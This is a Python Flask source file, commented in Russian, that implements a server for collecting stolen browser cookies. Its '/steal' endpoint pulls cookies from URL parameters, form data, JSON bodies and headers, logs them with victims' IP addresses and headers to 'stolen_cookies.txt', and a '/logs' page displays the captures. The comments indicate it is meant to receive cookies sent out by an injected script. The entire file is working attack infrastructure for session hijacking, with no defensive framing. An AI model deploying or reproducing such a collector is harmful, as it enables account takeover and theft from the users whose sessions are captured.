import os
import json
from urllib.parse import parse_qs
from datetime import datetime
from flask import Flask, request, jsonify

app = Flask(__name__)
COOKIE_FILE = "stolen_cookies.txt"

@app.route('/', methods=['GET', 'POST'])
@app.route('/steal', methods=['GET', 'POST'])
def steal_cookie():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # 1. Пытаемся получить данные из JSON (POST)
    json_data = {}
    if request.is_json:
        json_data = request.get_json()
    
    # 2. Пытаемся получить из form-data (POST)
    form_data = request.form.to_dict()
    
    # 3. Пытаемся получить из параметров URL (GET) - ЭТО ВАШ СЛУЧАЙ!
    url_params = request.args.to_dict()
    
    # 4. Пытаемся распарсить строку из URL, если она выглядит как "cookie1=value1; cookie2=value2"
    # Это самое важное для вашего скрипта!
    url_cookies = {}
    for key, value in url_params.items():
        if ';' in value or '=' in value:
            # Возможно, это строка с куками
            parts = value.split(';')
            for part in parts:
                if '=' in part:
                    k, v = part.strip().split('=', 1)
                    url_cookies[k] = v
    
    # 5. Получаем куки из заголовков (обычный способ)
    header_cookies = dict(request.cookies)
    
    # Объединяем все найденные куки
    all_cookies = {**header_cookies, **url_cookies}
    
    # Если в URL параметрах есть что-то, что не распарсилось как куки, сохраняем и это
    all_params = {**url_params}
    
    headers = dict(request.headers)
    
    record = {
        'timestamp': timestamp,
        'method': request.method,
        'path': request.path,
        'ip': request.remote_addr,
        'full_url': request.url,
        'url_params': url_params,
        'parsed_url_cookies': url_cookies,
        'header_cookies': header_cookies,
        'all_cookies_combined': all_cookies,
        'json_data': json_data,
        'form_data': form_data,
        'headers': headers
    }
    
    # Сохраняем в файл
    with open(COOKIE_FILE, 'a', encoding='utf-8') as f:
        f.write(json.dumps(record, ensure_ascii=False) + '\n')
    
    # Выводим в логи
    print(f"[{timestamp}] ПОЛУЧЕНЫ ДАННЫЕ:")
    print(f"Метод: {request.method}")
    print(f"URL: {request.url}")
    print(f"Куки из заголовков: {header_cookies}")
    print(f"Куки из URL (распарсенные): {url_cookies}")
    print(f"Все куки вместе: {all_cookies}")
    print("-" * 50)
    
    return jsonify({"status": "ok", "message": "Data received"})

@app.route('/logs')
def show_logs():
    if not os.path.exists(COOKIE_FILE):
        return "<h1>Пока нет данных</h1><p>Отправьте что-нибудь на /steal</p>"
    
    with open(COOKIE_FILE, 'r', encoding='utf-8') as f:
        lines = f.readlines()[-50:]  # последние 50 записей
    
    result = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Stolen Cookies Logs</title>
        <style>
            body { font-family: monospace; background: #f0f0f0; padding: 20px; }
            .record { background: white; border: 1px solid #ccc; margin: 10px 0; padding: 10px; border-radius: 5px; }
            .timestamp { color: #0066cc; font-weight: bold; }
            .cookies { background: #ffffcc; padding: 5px; border-left: 3px solid #ffaa00; }
            .url { color: #009900; }
            pre { background: #f5f5f5; padding: 5px; overflow-x: auto; }
        </style>
    </head>
    <body>
        <h1>📥 Последние 50 записей</h1>
    """
    
    for line in reversed(lines):  # показываем от новых к старым
        try:
            data = json.loads(line)
            result += f'<div class="record">'
            result += f'<div class="timestamp">🕒 {data["timestamp"]}</div>'
            result += f'<div>📌 Метод: {data["method"]}</div>'
            result += f'<div class="url">🔗 URL: {data.get("full_url", "N/A")}</div>'
            
            if data.get("all_cookies_combined"):
                result += f'<div class="cookies">🍪 Найденные куки:<br><pre>{json.dumps(data["all_cookies_combined"], indent=2, ensure_ascii=False)}</pre></div>'
            
            if data.get("url_params") and data["url_params"]:
                result += f'<div>📦 Параметры URL: <pre>{json.dumps(data["url_params"], indent=2, ensure_ascii=False)}</pre></div>'
            
            result += f'<div>🌐 IP: {data["ip"]}</div>'
            result += '</div>'
        except Exception as e:
            result += f'<div class="record">Ошибка парсинга: {line[:100]}...</div>'
    
    result += """
    </body>
    </html>
    """
    return result

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
